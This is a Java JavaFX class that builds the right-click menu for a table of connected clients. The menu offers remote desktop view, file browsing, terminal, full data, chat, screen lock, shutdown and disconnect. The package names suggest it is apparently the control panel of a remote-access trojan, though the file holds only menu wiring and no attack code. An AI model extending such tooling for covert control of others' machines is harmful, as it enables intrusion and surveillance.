package greek.horse.server.ui.formmaters;

import greek.horse.server.troyStructure.NetInfoTable;
import greek.horse.server.ui.ChatApp;
import greek.horse.server.ui.controllers.HorseController;
import javafx.embed.swing.SwingFXUtils;
import javafx.geometry.Insets;
import javafx.scene.control.*;
import javafx.scene.image.ImageView;
import javafx.util.Callback;

public class HorseRowFactory implements Callback<TableView<NetInfoTable>, TableRow<NetInfoTable>> {
    private final HorseController controller;

    public HorseRowFactory(HorseController horseController) {
        controller = horseController;
    }

    @Override
    public TableRow<NetInfoTable> call(TableView tableView) {
        TableRow<NetInfoTable> row = new TableRow<>();

        ContextMenu contextMenu = new ContextMenu();

        MenuItem desktop = new MenuItem("Desktop", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("desktopMonitor", 0.07), null)));
        MenuItem browseFiles = new MenuItem("Browse files", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("fileBrowser", 0.07), null)));
        MenuItem terminal = new MenuItem("Terminal", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("terminal", 0.07), null)));
        MenuItem data = new MenuItem("Full data", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("data", 0.07), null)));
        Menu monitoring = new Menu("Monitoring", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("monitoring", 0.07), null)));
        monitoring.getItems().addAll(desktop, browseFiles, terminal, data);


        MenuItem chat = new MenuItem("Chat", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("chat", 0.07), null)));
        MenuItem off = new MenuItem("Turn Off", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("off", 0.07), null)));
        CheckMenuItem lock = new CheckMenuItem("Lock", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("lock", 0.07), null)));
        Menu interaction = new Menu("Interaction", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("communication", 0.07), null)));
        interaction.getItems().addAll(chat, lock, off);


        MenuItem disconnect = new MenuItem("Disconnect", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("disconnect", 0.07), null)));
        MenuItem stop = new MenuItem("Stop",new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("stop", 0.07), null)));
        Menu manageClient = new Menu("Manage Client", new ImageView(SwingFXUtils.toFXImage(ChatApp.getImage("client", 0.07), null)));
        manageClient.getItems().addAll(disconnect, stop);

        desktop.setOnAction((event) -> {
            this.controller.contextDesktop(row);
        });

        disconnect.setOnAction((event) -> {
            this.controller.contextDisconnect(row);
        });

        browseFiles.setOnAction((event) -> {
            this.controller.contextFilesBrowser(row);
        });

        lock.setOnAction(event -> {
            this.controller.contextLock(row, lock.isSelected());
        });

        stop.setOnAction(event -> {
            this.controller.contextStop(row);
        });

        chat.setOnAction(event ->{
            this.controller.contextChat(row);
        });

        terminal.setOnAction(event -> {
            this.controller.contextTerminal(row);
        });

        off.setOnAction(event -> {
            this.controller.contextOff(row);
        });

        data.setOnAction(event -> {
            this.controller.contextFullData(row);
        });

        contextMenu.getItems().addAll(monitoring, interaction, manageClient);

        row.setContextMenu(contextMenu);
        row.setOpaqueInsets(new Insets(5));

        return row;
    }
}
